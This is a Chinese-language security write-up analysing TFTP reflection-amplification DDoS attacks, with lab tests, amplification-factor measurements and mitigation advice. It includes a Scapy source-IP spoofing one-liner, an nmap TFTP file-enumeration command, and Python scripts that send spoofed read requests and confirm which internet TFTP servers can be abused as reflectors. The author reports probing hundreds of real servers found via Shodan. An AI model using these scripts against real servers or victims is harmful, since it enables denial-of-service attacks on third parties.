# TFTP反射放大攻击浅析

0x00 前言
=======

* * *

经由[@杀戮](http://drops.wooyun.org/author/%E6%9D%80%E6%88%AE)提示，让我看看softpedia上的[这篇报道](http://news.softpedia.com/news/600-000-tftp-servers-can-be-abused-for-reflection-ddos-attacks-501568.shtml)，咱就来研究一下文中的使用TFTP（Trivial File Transfer Protocol,简单文件传输协议）进行反射型DDOS攻击。在报道的最后提到了[Evaluation of TFTP DDoS amplification attack](http://researchrepository.napier.ac.uk/8746/)这篇论文，论文还是比较学术派和严谨的，其中使用GNS3和虚拟机搭建模拟环境，尽量严格控制相关变量与不变量，对TFTPD32，SolarWinds，OpenTFTP三种TFTP服务器进行研究。论文中还利用TFTP协议自身的缺陷来进行DOS攻击，同时对DOS攻击的反射因子，请求响应延迟，总吞吐量，CPU消耗率等方面进行了详细的测验与评估。

当然，自己实际地测试观察TFTP反射放大攻击的影响还是很有必要的。所以本文就在那篇论文的基础上，利用Kali2等虚拟机，对反射流量和反射因子进行检测计算，适当探究相关的限制与利用。

0x01 TFTP服务搭建
=============

* * *

DDOS是分布式拒绝服务攻击，研究的基础也就在于拒绝服务；论文中三种TFTP服务器的测试也是为了相互对比参照，由于不同服务器的特性不同而响应的行为也不同，其中的任何一种服务也具有通用的特性。所以为了方便验证研究，我们就简单地搭建在Kali2上搭建tftp服务（对于协议特点的学习，我比较喜欢直观的办法，搭建好必要服务后抓包看其数据包的结构），对其反射放大流量的利用进行测试，而暂且抛开分布式和其他类型服务器的对比话题。相信这些都是见微知著的，也欢迎你进行其他方面的深入探究交流。

我们在[更新源](http://jingyan.baidu.com/article/454316ab6fb11af7a7c03ae0.html?qq-pf-to=pcqq.group)了的Kali2上进行tftp的安装，详细过程可见[这里](http://askubuntu.com/questions/201505/how-do-i-install-and-run-a-tftp-server)和[那里](https://doc.ubuntu-fr.org/tftpd)。在Kali上自带的有tftp客户端，我们可以不用再进行安装。其中主要使用了使用[xinetd](http://www.cnblogs.com/itech/archive/2010/12/27/1914846.html)超级守护进程更加方便安全地管理使用tftp服务。最后在服务都安装好后，测试图如下：

![](http://drops.javaweb.org/uploads/images/e70cd63f5bb28664b3e98b43027788a152869678.jpg)

在这里值得一提的是，客户端上键入`?`发现有`put`命令可以直接上传文件，但是会引发`Error code 2: Access violation`错误。究其原因查看`man`手册可知道，因为咱们之前在登录的时候没有经过认证就可以读取文件，所以处于安全的考虑，只有文件存在而且对于所有的用户都可写才能`put`相应文件，这一点也会成为之后攻击的一个限制。

0x02 TFTP协议简介
=============

* * *

对于TFTP协议[百度](http://baike.baidu.com/link?url=-5Uzv3Mrh9eV3-WnpBBtllBZKT5uXLNgGj7YU1RyeOvdCWtHDlI4s4el5wdOVoKCK47dgUwtu11AO6ZvQ44Srq)和[WiKi](https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol)也有比较详细的介绍，这里不多赘述。我觉得其中最需要理解的有以下三点：

1.  TFTP是基于UDP的，也就是没有状态性，其端口号为69
2.  无认证过程（对源地址和目的地址均无）
3.  TFTP几种不同类型的数据包在传递信息时的交互过程

下面给出TFTP数据包的[几种类型](https://www.ietf.org/rfc/rfc1350.txt)：

```
TFTP Formats    

   Type   Op #     Format without header    

          2 bytes    string   1 byte     string   1 byte
          -----------------------------------------------
   RRQ/  | 01/02 |  Filename  |   0  |    Mode    |   0  |
   WRQ    -----------------------------------------------
          2 bytes    2 bytes       n bytes
          ---------------------------------
   DATA  | 03    |   Block #  |    Data    |
          ---------------------------------
          2 bytes    2 bytes
          -------------------
   ACK   | 04    |   Block #  |
          --------------------
          2 bytes  2 bytes        string    1 byte
          ----------------------------------------
   ERROR | 05    |  ErrorCode |   ErrMsg   |   0  |
          ----------------------------------------

```

就拿A对S上的`RRQ (read request)`文件过程来演示一下，如下图：

![](http://drops.javaweb.org/uploads/images/eece5a4e9837f07c0fe09c23967e774b3898376a.jpg)

具体过程文字描述如下：

1.  A向S的69端口发送RRQ数据包请求读取文件，其中包括文件名和传输使用的模式
2.  S再新开一个端口发送DATA数据包开始传输文件，其中Data段中包含着文件内容，如果大于512字节（默认值），就会进行分块传输（对应标记Block的值），直到最后一次发送的数据包Data段小于512字节
3.  A在接收到DATA数据包后就向S发送ACK数据包进行确认，其中的Block就为接收到的DATA数据包中的Blocak，然后S才会继续发下一个Block的DATA数据包
4.  如果S没有接收到A的ACK数据包，S就会重传刚才发过的DATA数据包

实际测试的抓包图如下：

![](http://drops.javaweb.org/uploads/images/5d881f816d5c735bd2be32b63bccac41f6e271b3.jpg)

0x03 反射放大攻击
===========

* * *

反射是过程，放大是结果。对于拒绝服务攻击来说，常用的方式有这么几种：1.滥用合理的服务请求；2.制造高流量无用数据；3.利用传输协议缺陷；4.利用服务程序的漏洞。TFTP反射放大攻击就是利用了协议上的缺陷或者说是特性，其中关键点有二：

1.  没有认证过程，这样就可以随意登录读取文件，同时伪造源（攻击目标）IP地址，为反射做好准备
2.  之前提到的重传机制，当服务端在没有收到我们的攻击目标的ACK包时，就会重传一定的次数给攻击目标，达到放大的目的

下面我就在本机上借由[Scapy](https://github.com/Larryxi/Scapy_zh-cn)伪造源地址数据包，向服务端(Kali2)发送RRQ数据包请求`get`服务器上的文件，进而将响应DATA包发射给目标机(XP)，诱发重传机制造成放大攻击。利用Scapy如下：

```
>>> a = IP(dst='192.168.1.104',src='192.168.1.102')/UDP(sport=445,dport=69)/TFTP()/TFTP_RRQ(filename='larry')
>>> a
<IP  frag=0 proto=udp src=192.168.1.102 dst=192.168.1.104 |<UDP  sport=microsoft_ds dport=tftp |<TFTP  op=RRQ |<TFTP_RRQ  filename='larry' |>>>>

```

也还是有两点需要说明，我们这里伪造的源端口用的是XP SP3默认开启的UDP端口之一(123,137,138,445,500,1900)，当然你也可以用其他你在攻击目标上扫描出来的端口；另一点就是为了达到放大数据包大小的最佳效果，我们这里`RRQ`的已知文件的大小必须大于512字节为好。三个主机在同一个网段下的测试结果图如下：

![](http://drops.javaweb.org/uploads/images/94a52d45a70179da5195f3d19700ab27f1fbd7dc.jpg)

在搭建传统的LAN环境的时候，会要求TFTP服务器对所有客户端是可连接的，通常会将其拿来当做内部网络网关。如果这些TFTP服务器同时暴露在外的话，我们就可以利用其在网络当中的角色加上对源地址无验证的缺陷,对内网机器进行DOS攻击。当然鸡肋的会是我们不知道在内网当中有哪些机器，就算攻击成功了，由于没有回执响应，我们就不知道实际情况是如何而“盲打”一通了。在vbox当中创建一个[内网环境](https://www.youtube.com/watch?v=nsbxw_jx1wQ)，同时给服务端设置[两个网卡](http://gfrog.net/2008/01/config-file-in-debian-interfaces-1/)，测试结果如下：

![](http://drops.javaweb.org/uploads/images/e9c0177cc6abd47a5e038739759af774d1a3d5b4.jpg)

从以上的测试结果可以看出由于tftpd服务的特性，在服务端未接收到ACK数据包时，会默认进行5次重传，并且重传时间间隔（可设置）为5秒。对于不同的反射放大攻击，例如[Smurf](http://baike.baidu.com/link?url=S20WqQCEfXL7YDelSc2bVLw-veVfXFPpYdsy64mCQZ_kV66yFpq3fsDTVWT9rN2xU-hO6PIJAbSKjUzAU9j9XK)，DNS，[NTP](http://drops.wooyun.org/papers/926)，TCP-based，[SNMP](http://drops.wooyun.org/tips/2106)等反射放大攻击，研究时通常会计算其中的反射因子/放大倍数作为相互比较的标准。在基于tftpd的TFTP反射放大攻击中，这里响应数据包大小总和比上请求数据包大小为：`558*5/60=46.5`。为了简单地对比一下，我还是在XP上下载了[tftpd32](http://tftpd32.jounin.net/tftpd32_download.html)，然后再去`get`自带的文件`tftpd32.chm`（其实在默认状态下tftpd32是允许`put`文件的，但也可在`Setting`中设置为`Read Only`模式）。tftpd32的特性就是会重传6次，时间间隔依次为1,2,3,3,3秒，最后还会发送一个ERROR数据包。这里抛开ERROR数据包计算反射因子的话就是`558*6/62=54`。

![](http://drops.javaweb.org/uploads/images/ef24d54e241c93abdf9dc24a1430f305a444e3ba.jpg)

在论文中的tftpd32版本可能有所不同，反射因子为`59.78`，这个放大因子和其他反射放大攻击相比较还是很可观的：

![](http://drops.javaweb.org/uploads/images/988085d35adf2123afeadeaaf4ef8e1c358d44f0.jpg)

0x04 限制及解决方案
============

* * *

在以上的测试过程中，对于TFTP反射放大攻击利用的限制点主要有三点：

**1. 获取TFTP服务器上存在的文件名**

虽然服务器端无认证过程可以随意登录，但是无法列目录，而造成反射的基础就是需要服务端能够发送出DATA数据包。这就需要我们一个个`get`测试看看TFTP服务器上存在哪些常见的文件了，我们可以对思科（广泛使用TFTP服务）设备文件和其他你认为有可能存在的文件进行测试。还好[nmap](http://seclists.org/nmap-dev/2011/q2/730)在这里给我们提供了一个[tftp-enum.nse](https://nmap.org/nsedoc/scripts/tftp-enum.html)脚本，可以如下使用：

```
$ sudo nmap -sU -p 69 --script tftp-enum.nse --script-args="tftp-enum.filelist=customlist.txt" <host>

```

如果未加`--script-args`的话，脚本会默认调用[tftplist.txt](https://github.com/nmap/nmap/blob/master/nselib/data/tftplist.txt)文件去枚举可能存在的文件。当然，`tftp-enum.filelist`可以指定自定义的列表进行枚举扫描。测试结果示例如下：

![](http://drops.javaweb.org/uploads/images/2e2c8d939e6c5762c154b4298b77c928f540e55f.jpg)

论文当中说是有[599600](http://internetcensus2012.bitbucket.org/serviceprobe_overview.html)台（2012年扫描结果）对外开放的TFTP服务器可能会被用来进行发射放大攻击，但在[shodan](https://www.shodan.io/search?query=tftp)上搜索`tftp`的结果也只有10w左右的样子，可能有待进一步的扫描发现。以下是我在[shodan](https://shodanio.wordpress.com/2014/12/01/using-shodan-from-the-command-line/)中搜索出的999个IP进行测试，其中有47个服务器可以`get`到默认的文件：

![](http://drops.javaweb.org/uploads/images/e6d08f37c29c45555cecb9baa3e3a01bfa13f958.jpg)

**2. TFTP服务器上已知文件的大小**

反射过来的DATA数据包的大小取决于读取文件的内容大小，这样就决定了我们最终反射放大的程度（相对于已知文件的文件名长度——影响请求包大小）。如果DATA数据包过小造成的影响也就很有限的了。

**3. 确定TFTP服务器可利用**

除了以上两点，如果存在其他的过滤机制，我们最终就需要测试一下该TFTP服务是否可利用，在攻击端伪造简单的数据包触发其反射到指定的主机上，代码如下：

```
#!/usr/bin/env python
#coding=utf-8    

import optparse
import sys
import logging    

from scapy.all import *    

class Trigger(object):
    def __init__(self, target, port, filename, server):
        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
        self.target = target
        self.port = port
        self.filename = filename
        self.server = server    

    def run(self):
        t = IP(src=self.target, dst=self.server)/UDP(sport=self.port, dport=69)/TFTP()/TFTP_RRQ(filename=self.filename)
        send(t)
        print '[+] The trigger has benn sent !'    

if __name__ == '__main__':
    parser = optparse.OptionParser('uasge: %prog [options]')
    parser.add_option('-t', '--target', default=None,help='The ip of target')
    parser.add_option('-f', '--filename', default='larry', help='The filename for RRQ')
    parser.add_option('-p', '--port', type=int, default=2333, help='The src port of target')    

    (options, args) = parser.parse_args()
    if len(args) < 1 or options.target == None:
        parser.print_help()
        sys.exit(0)    

    trigger = Trigger(target=options.target, port=options.port, filename=options.filename, server=args[0])    

    trigger.run()

```

在我们之前指定的主机上检测一下是否有如期的DATA数据包到来即可，代码如下：

```
#!/usr/bin/env python
#coding=utf-8    

import optparse
import sys
import logging    

from scapy.all import *    

class Sniff(object):
    def __init__(self, port):
        logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
        self.port = port    

    def run(self):
        try:
            sniff(prn=self.udp_monitor_callback, filter='udp', store=0)
        except KeyboardInterrupt as e:
            print '[+] Bye !'
            sys.exit(0)    

    def udp_monitor_callback(self, pkt):
        if pkt.getlayer(Raw):
            raw_load = pkt.getlayer(Raw).load
            if pkt[UDP].dport == self.port and raw_load[:4] == '\x00\x03\x00\x01':
                print '[+] The server %s is available' % (pkt[IP].src)
                sys.exit(0)    

if __name__ == '__main__':
    parser = optparse.OptionParser('usage: %prog [options]')
    parser.add_option('-p', '--port', type=int, default=2333, help='The port from server')    

    (options, args) = parser.parse_args()
    if len(args) > 0:
        parser.print_help()
        sys.exit(0)    

    s = Sniff(port=options.port)    

    s.run()

```

这样一放一收就可以知道该TFTP服务器是否可以利用了。

0x05 防御及相关对策
============

* * *

1.  虽然有些TFTP服务器因为配置错误而暴露在外，但还是应该利用防火墙将其从互联网上隔离
2.  对流经TFTP服务的流量设置相关入侵检测机制
3.  将重传（数据包）率设置为1，但还是需要和服务不可达的情况做一下平衡
4.  简化自定义错误消息（有些tftp服务具有在重传无响应后还会发送ERROR数据包，间接将流量放大）；记录响应的日志；限制请求数据包的数量